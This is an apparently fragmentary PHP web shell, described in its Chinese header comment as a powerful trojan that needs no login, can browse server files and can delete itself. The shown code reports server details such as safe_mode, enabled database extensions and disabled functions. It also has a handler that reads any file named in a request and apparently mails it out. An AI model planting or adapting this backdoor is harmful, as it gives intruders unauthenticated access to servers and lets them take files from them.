...
// 程序是无意中在国外的网站上得到 很强的一个木马程序，可以看到服务器上的一些文件，也可以把自己给删除了
// 无需登陆
...
.table1 {
BORDER-RIGHT:  #111111 0px;
BORDER-TOP:    #111111 0px;
BORDER-LEFT:   #111111 0px;
BORDER-BOTTOM: #111111 0px;
...
table {
BORDER-RIGHT:  #111111 1px outset;
BORDER-TOP:    #111111 1px outset;
BORDER-LEFT:   #111111 1px outset;
BORDER-BOTTOM: #111111 1px outset;
BACKGROUND-COLOR: #aaaaaa;
}
input {
BORDER-RIGHT:  #111111 1px solid;
...
echo '<body bgcolor="#000000"><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
...
echo ws(2);
echo (($safe_mode)?("safe_mode: <b><font color=red>ON</font></b>"):("safe_mode: <b><font color=000000>OFF</font></b>"));
echo ws(2);
echo "PHP version: <b>".@phpversion()."</b>";
$curl_on = @function_exists('curl_version');
echo ws(2);
echo "cURL: ".(($curl_on)?("<b><font color=000000>ON</font></b>"):("<b><font color=red>OFF</font></b>"));
echo ws(2);
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=000000>ON</font></b>"; } else { echo "<font color=red>OFF</font></b>"; }
echo ws(2);
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=red>ON</font></b>";}else{echo "<font color=000000>OFF</font></b>";}
echo ws(2);
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=red>ON</font></b>";}else{echo "<font color=000000>OFF</font></b>";}
echo ws(2);
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=red>ON</font></b>";}else{echo "<font color=000000>OFF</font></b>";}
echo "<br>".ws(2);
echo "Disable functions : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=000000>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
...
{
echo '<font color=666666><b>OS :'.ws(1).'<br>Server :'.ws(1).'<br>User :'.ws(1).'<br>pwd :'.ws(1).'</b></font><br>';
echo "</td><td>";
...
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 ...
 if(!$file=@fopen($_POST['loc_file'],"r")) { echo re($_POST['loc_file']); $_POST['cmd']=""; }
 else
  {
    ...
    if(empty($_POST['subj'])) { $_POST['subj'] = 'file'; }
    if(empty($_POST['from'])) { $_POST['from'] = 'bce.no.xyu@rambler.ru'; }
...
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):(""))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):(""))));
...
echo '</table>'.$table_up3."</div></div><font face=Verdana size=-2><b><div align=center id='n'>------------</div></td></tr></table>";
?>